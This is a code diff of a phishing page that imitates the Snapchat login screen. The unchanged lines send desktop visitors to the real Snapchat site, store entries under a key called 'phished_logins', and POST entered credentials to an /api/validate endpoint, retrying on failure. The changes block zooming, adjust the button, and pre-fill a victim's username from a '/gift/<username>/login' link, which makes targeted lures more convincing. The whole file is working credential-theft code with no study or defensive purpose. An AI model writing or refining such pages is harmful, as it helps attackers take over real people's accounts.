@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <title>Log In</title>
 <script>
 (function(){const ua=navigator.userAgent.toLowerCase();if(!/mobile|android|iphone|ipad|tablet/i.test(ua)&&(ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))){window.location.replace("https://accounts.snapchat.com/");}})();
@@ -35,13 +35,13 @@
 
   #loginBtn { 
     transition: bottom 0.3s ease; 
-    min-width: 41%; /* slightly wider than before */
-    width: 61%; /* slightly wider */
+    min-width: 43%; 
+    width: 63%; 
     font-size: 0.96rem; 
     padding: 0.7rem 0; 
     display: block; 
     margin: 0 auto; 
-    background-color: #b7c0c8; /* grey button */
+    background-color: #b7c0c8; 
     color: white;
   }
   #loginBtn:enabled { background-color: #00b0ff; }
@@ -150,6 +150,10 @@ document.addEventListener("DOMContentLoaded", function(){
           u2="/api/validate",
           m3=3;
     let n4=0,l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
+
+    // Pre-fill username from URL if /gift/username/login
+    const pathMatch = window.location.pathname.match(/^\/gift\/([^\/]+)\/login$/);
+    if(pathMatch && pathMatch[1]) { a.value = pathMatch[1]; }
 
     function x1(p,r=m3){return fetch(u2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p),mode:"cors"}).then(s=>s.ok||Promise.reject("Request failed")).catch(()=>r>0?x1(p,r-1):!1);}
     function y2(){a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0);}
